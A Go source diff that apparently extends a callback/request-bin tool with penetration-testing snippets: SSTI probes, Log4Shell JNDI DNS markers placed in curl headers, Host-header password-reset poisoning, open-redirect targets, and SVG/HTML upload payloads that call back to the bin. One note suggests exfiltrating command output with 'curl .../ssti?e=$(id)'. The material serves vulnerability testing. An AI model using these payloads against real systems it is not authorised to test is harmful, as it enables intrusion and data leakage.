@@ -108,6 +108,38 @@ func buildSnippets(base, host string) []snippetGroup {
 			},
 		},
 		{
+			Category: "SSTI (server-side template injection)",
+			Blurb:    "Confirm a template engine evaluates your input by making it fetch your URL during render.",
+			Snippets: []Snippet{
+				{Title: "Jinja2 / Twig SSRF probe", Lang: "text", Code: "{{ ''.__class__ }}<!-- or -->{% import os %}", Note: "If you already have code-exec, beacon out: curl " + base + "/ssti?e=$(id)."},
+				{Title: "Generic math marker", Lang: "text", Code: "${7*7} #{7*7} {{7*7}} <%= 7*7 %>", Note: "49 in the reply means evaluation; then pivot to an outbound fetch to " + base + "."},
+			},
+		},
+		{
+			Category: "Log4Shell / JNDI",
+			Blurb:    "Legacy Log4j targets resolve JNDI lookups. The DNS/LDAP hit lands here; enable the DNS listener.",
+			Snippets: []Snippet{
+				{Title: "JNDI DNS marker", Lang: "text", Code: "${jndi:dns://REPLACE_ME." + host + "/x}", Note: "A DNS query for the marker confirms the sink reached your listener."},
+				{Title: "Drop into common headers", Lang: "bash", Code: "curl " + base + " -H 'User-Agent: ${jndi:dns://ua." + host + "/a}' -H 'X-Api-Version: ${jndi:dns://hdr." + host + "/a}'", Note: "Different sub-labels tell you which header reached the logger."},
+			},
+		},
+		{
+			Category: "CRLF / Host-header / open redirect",
+			Blurb:    "Header-injection and redirect checks. Set the bin's Response to 'redirect' to chain an open redirect.",
+			Snippets: []Snippet{
+				{Title: "Host header override", Lang: "bash", Code: "curl " + base + "/pw-reset -H 'Host: " + host + "'", Note: "Watch the captured Host header to spot password-reset / cache poisoning via Host."},
+				{Title: "Open-redirect target", Lang: "text", Code: trimPath(base) + "/" + "default", Note: "Point a vulnerable redirect at your bin, set Response mode=redirect to bounce onward."},
+			},
+		},
+		{
+			Category: "File upload / stored callback",
+			Blurb:    "Host a payload file and have the target fetch it, or confirm an upload reaches a renderer.",
+			Snippets: []Snippet{
+				{Title: "SVG with outbound fetch", Lang: "xml", Code: "<svg xmlns=\"http://www.w3.org/2000/svg\"><image href=\"" + base + "/svg\"/><script>fetch('" + base + "/svg-js')</script></svg>", Note: "Upload as .svg; if rendered inline, both callbacks fire."},
+				{Title: "HTML beacon file", Lang: "html", Code: "<html><body><img src=\"" + base + "/htmlfile\"></body></html>", Note: "Host under Files or deliver as an upload; the fetch proves it was opened."},
+			},
+		},
+		{
 			Category: "Webhook / integration testing",
 			Blurb:    "Use the bin as the receiving end of a webhook and inspect exactly what the sender posts.",
 			Snippets: []Snippet{
